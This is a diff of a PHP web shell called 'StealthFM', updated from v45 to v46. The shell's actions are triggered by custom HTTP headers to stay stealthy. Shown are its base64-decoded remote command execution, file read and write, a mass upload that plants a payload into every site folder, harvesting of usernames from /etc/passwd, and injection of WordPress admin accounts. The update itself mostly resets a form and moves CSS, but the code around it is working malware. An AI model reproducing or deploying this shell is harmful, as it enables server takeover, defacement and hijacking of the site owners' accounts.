@@ -1,6 +1,6 @@
 <?php
 // -------------------------------------------------------------------------
-// STEALTH FM V45 (FINAL FIX: HEADER-BASED PROTOCOL)
+// STEALTH FM V46 (FINAL COMPLETE: BASE V45 + AUTO RESET)
 // -------------------------------------------------------------------------
 
 // 1. STEALTH MODE
@@ -33,7 +33,7 @@ $h_cmd   = 'HTTP_X_CMD';
 $h_tool  = 'HTTP_X_TOOL';
 $h_step  = 'HTTP_X_STEP'; 
 $h_enc   = 'HTTP_X_ENCODE'; 
-$h_mmode = 'HTTP_X_MASS_MODE'; // V45 NEW HEADER
+$h_mmode = 'HTTP_X_MASS_MODE'; 
 
 $root = realpath(__DIR__); 
 
@@ -88,7 +88,7 @@ function human_filesize($bytes, $dec = 2) {
     return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
 }
 
-// --- V44/V45 SMART TARGET SCANNER ---
+// --- V45 SMART SCANNER ---
 function scan_smart_targets($base_dir) {
     $targets = [];
     $items = @scandir($base_dir);
@@ -107,7 +107,6 @@ function scan_smart_targets($base_dir) {
     }
     return $targets;
 }
-// ------------------------------------
 
 if (isset($_SERVER[$h_act])) {
     $action = $_SERVER[$h_act];
@@ -149,6 +148,7 @@ if (isset($_SERVER[$h_act])) {
 
     if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
     
+    // --- V42: DECODE B64 INPUT ---
     if ($action === 'save' || $action === 'upload') { 
         $input = file_get_contents("php://input"); 
         if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') {
@@ -162,6 +162,7 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).'/'.$n) ? "Renamed" : "Fail"; exit; }
     if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
+    // --- V42: POLYGLOT CMD ---
     if ($action === 'cmd') {
         $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
         $cmd_exec = $cmd . " 2>&1";
@@ -195,9 +196,8 @@ if (isset($_SERVER[$h_act])) {
         $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
         $home_dirs = get_home_dirs();
 
-        // --- V45 FIX: MASS UPLOAD PROTOCOL ---
+        // --- V45: FIXED MASS UPLOAD PROTOCOL ---
         if ($tool === 'mass_upload') {
-            // Fix: Baca mode dari Header, bukan parameter yang merusak Body
             $mode = isset($_SERVER[$h_mmode]) ? $_SERVER[$h_mmode] : 'init';
             $tmp_list = sys_get_temp_dir() . "/sfm_mass_targets.json";
             $tmp_file = sys_get_temp_dir() . "/sfm_mass_payload.tmp";
@@ -205,11 +205,7 @@ if (isset($_SERVER[$h_act])) {
             if ($mode === 'init') {
                 $input = file_get_contents("php://input");
                 if (isset($_SERVER[$h_enc]) && $_SERVER[$h_enc] === 'b64') $input = base64_decode($input);
-                
-                // Simpan payload murni
                 file_put_contents($tmp_file, $input);
-
-                // Smart Scan
                 $targets = scan_smart_targets($target); 
                 file_put_contents($tmp_list, json_encode($targets));
                 json_out(['status' => 'ready', 'total' => count($targets)]);
@@ -231,7 +227,7 @@ if (isset($_SERVER[$h_act])) {
                 }
 
                 $batch = array_slice($targets, $step, $limit);
-                $payload = file_get_contents($tmp_file); // Ini sekarang pasti berisi data
+                $payload = file_get_contents($tmp_file);
                 $count_ok = 0;
 
                 foreach($batch as $dir) {
@@ -243,8 +239,7 @@ if (isset($_SERVER[$h_act])) {
             }
             exit;
         }
-        // -------------------------------------
-
+        
         if ($tool === 'bypass_user') {
             $found = ""; $etc = x_read("/etc/passwd");
             if ($etc) { $lines = explode("\n", $etc); foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; } } 
@@ -252,6 +247,7 @@ if (isset($_SERVER[$h_act])) {
             if(!empty($found)) { x_write("passwd.txt", $found); echo "Saved to: passwd.txt\nTotal Found: " . count(explode("\n", trim($found))); } else echo "Failed."; exit;
         }
 
+        // --- FULL ADD ADMIN LOGIC (V42/V45) ---
         if ($tool === 'add_admin') {
             $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
             $limit = 5; 
@@ -284,6 +280,7 @@ if (isset($_SERVER[$h_act])) {
                         $site_url = ""; $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
                         if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
                         $disp_url = parse_url($site_url, PHP_URL_HOST); if(!$disp_url) $disp_url = $site_url;
+                        
                         $st_txt = "CREATED"; $st_cls = "created"; 
                         $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                         if ($chk && @mysqli_num_rows($chk) > 0) {
@@ -329,7 +326,7 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v45</title>
+    <title>StealthFM v46</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
@@ -401,9 +398,10 @@ if (isset($_SERVER[$h_act])) {
         .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
         .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
         
+        /* MATCH UP ICON SIZE */
         .btn-icon-path { 
             background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; 
-            font-size: 1.1rem; 
+            font-size: 1.1rem; /* Same as icon-dir */
             cursor: pointer; transition: 0.2s; 
         }
         .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }
@@ -462,18 +460,6 @@ if (isset($_SERVER[$h_act])) {
         .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
         .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
         
-        /* ASYNC WIDGET */
-        #async-widget {
-            position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000;
-            background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
-            display: none; font-family: 'JetBrains Mono';
-        }
-        .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
-        .aw-body { padding: 12px; }
-        .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
-        .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
-        .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
-
         /* TOAST */
         #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
         .toast-msg {
@@ -509,6 +495,18 @@ if (isset($_SERVER[$h_act])) {
         @keyframes toastIn { to { opacity: 1; transform: translateX(0); } }
         @keyframes toastOut { to { opacity: 0; transform: translateX(20px); } }
         
+        /* V44+ ASYNC WIDGET */
+        #async-widget {
+            position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000;
+            background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            display: none; font-family: 'JetBrains Mono';
+        }
+        .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
+        .aw-body { padding: 12px; }
+        .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+        .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
+        .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
+        
         @media (max-width: 768px) { 
             .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } 
             .d-mobile-none { display: none !important; } .tools-list { grid-template-columns: 1fr; } 
@@ -537,15 +535,6 @@ if (isset($_SERVER[$h_act])) {
 
 <div id="toast-container"></div>
 
-<div id="async-widget">
-    <div class="aw-header"><span id="aw-title">MASS UPLOAD</span><i class="fas fa-compress cursor-pointer" onclick="toggleWidget()"></i></div>
-    <div class="aw-body" id="aw-content">
-        <div class="progress-bar-bg"><div class="progress-bar-fill" id="aw-prog"></div></div>
-        <div class="aw-stat"><span>Processed: <b id="aw-done" class="text-white">0</b></span><span>Total: <b id="aw-total">0</b></span></div>
-        <div class="mt-2 text-center"><small class="text-secondary" id="aw-status">Initializing...</small></div>
-    </div>
-</div>
-
 <div class="container-fluid path-wrapper">
     <div class="sys-info-box">
         <div class="sys-row" style="color:#eee; font-weight:bold; margin-bottom:8px;">System Info: <span class="sys-val"><?php echo $sys['os']; ?></span></div>
@@ -563,7 +552,7 @@ if (isset($_SERVER[$h_act])) {
 
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v45</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v46</div></div>
         <div class="term-input-row"><span class="term-prompt">&#10140;</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
@@ -620,7 +609,7 @@ if (isset($_SERVER[$h_act])) {
 </div>
 
 <div class="modal fade" id="massUploadModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Smart Mass Upload</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body">
-    <div class="mb-3"><label class="small text-secondary">Target Filename</label><input type="text" id="mass-name" class="form-control bg-dark text-light border-secondary" value="index.php"></div>
+    <div class="mb-3"><label class="small text-secondary">Target Filename</label><input type="text" id="mass-name" class="form-control bg-dark text-light border-secondary" placeholder="example: index.php"></div>
     <div class="mb-3"><label class="small text-secondary">File Content</label><textarea id="mass-content" class="form-control bg-dark text-light border-secondary" rows="4"></textarea></div>
     <div class="d-flex align-items-center gap-2"><div class="flex-grow-1 border-top border-secondary"></div><span class="small text-secondary">OR UPLOAD</span><div class="flex-grow-1 border-top border-secondary"></div></div>
     <div class="mt-3"><input type="file" id="mass-file-in" class="form-control bg-dark border-secondary text-secondary"></div>
@@ -628,6 +617,15 @@ if (isset($_SERVER[$h_act])) {
         <i class="fas fa-info-circle"></i> <b>Smart Mode:</b> Uploads to immediate subfolders + public_html only. Fast & Safe.
     </div>
 </div><div class="modal-footer"><button class="btn btn-upload-modern w-100" onclick="startMassUpload()">START BACKGROUND TASK</button></div></div></div></div>
+
+<div id="async-widget">
+    <div class="aw-header"><span id="aw-title">MASS UPLOAD</span><i class="fas fa-compress cursor-pointer" onclick="toggleWidget()"></i></div>
+    <div class="aw-body" id="aw-content">
+        <div class="progress-bar-bg"><div class="progress-bar-fill" id="aw-prog"></div></div>
+        <div class="aw-stat"><span>Processed: <b id="aw-done" class="text-white">0</b></span><span>Total: <b id="aw-total">0</b></span></div>
+        <div class="mt-2 text-center"><small class="text-secondary" id="aw-status">Initializing...</small></div>
+    </div>
+</div>
 
 <div class="cyber-footer">
     <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">xshikataganai</span></span>
@@ -828,7 +826,7 @@ if (isset($_SERVER[$h_act])) {
         }
     });
 
-    // --- V45 JS LOGIC: FIXED PROTOCOL ---
+    // --- V46 FIX: SHOW & CLEAN FORM ---
     function showMassUpload() { toolsModal.hide(); massUploadModal.show(); }
     
     function startMassUpload() {
@@ -853,7 +851,6 @@ if (isset($_SERVER[$h_act])) {
 
     function initMassTask(filename, b64content) {
         updateWidget(0, 0, 'Scanning Directories... (Fast)');
-        // V45 FIX: Kirim 'mode' lewat HEADER. Payload bersih.
         api('tool', currentPath, 'PUT', {'X-Tool':'mass_upload','X-Encode':'b64', 'X-Mass-Mode':'init'}, b64content).then(r => r.json()).then(res => {
             if(res.status === 'ready') {
                 showToast(`Scan complete. Found ${res.total} folders.`);
@@ -868,13 +865,18 @@ if (isset($_SERVER[$h_act])) {
 
     function processMassBatch(step, filename, total) {
         updateWidget(step, total, `Uploading batch ${step}...`);
-        // V45 FIX: Kirim 'mode' lewat HEADER.
         api('tool', currentPath, 'GET', {'X-Tool':'mass_upload', 'X-Step':step, 'X-Data':btoa(filename), 'X-Mass-Mode':'process'}).then(r => r.json()).then(res => {
             if (res.status === 'continue') {
                 processMassBatch(res.next_step, filename, total);
             } else {
                 updateWidget(total, total, 'DONE!');
                 showToast('Mass Upload Completed!', 'success');
+                
+                // V46 UPDATE: RESET FORM AFTER DONE
+                document.getElementById('mass-name').value = '';
+                document.getElementById('mass-content').value = '';
+                document.getElementById('mass-file-in').value = '';
+
                 setTimeout(() => { document.getElementById('async-widget').style.display = 'none'; }, 5000);
             }
         }).catch(e => {
@@ -891,8 +893,7 @@ if (isset($_SERVER[$h_act])) {
         document.getElementById('aw-status').innerText = status;
     }
     function toggleWidget() { let b = document.getElementById('aw-content'); b.style.display = (b.style.display === 'none') ? 'block' : 'none'; }
-    // ------------------------------------
-
+    
     function runTool(toolName) { showLog(); let log = document.getElementById('global-log'); log.innerHTML += `<div class="text-primary mb-2"><i class="fas fa-cog fa-spin me-2"></i>Running ${toolName}...</div>`; api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div class="text-success mt-2"><i class="fas fa-check me-2"></i>Done.</div><hr class="border-secondary">`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div class="text-danger">Error: ${e}</div>`; }); }
     function runWatchdogTool(toolName, step) {
         let log = document.getElementById('global-log'); if(step === 0) { showLog(); log.innerHTML = `<div class="text-warning mb-2"><i class="fas fa-running me-2"></i>Starting ${toolName} (Fast Mode)...</div><hr class="border-secondary">`; }
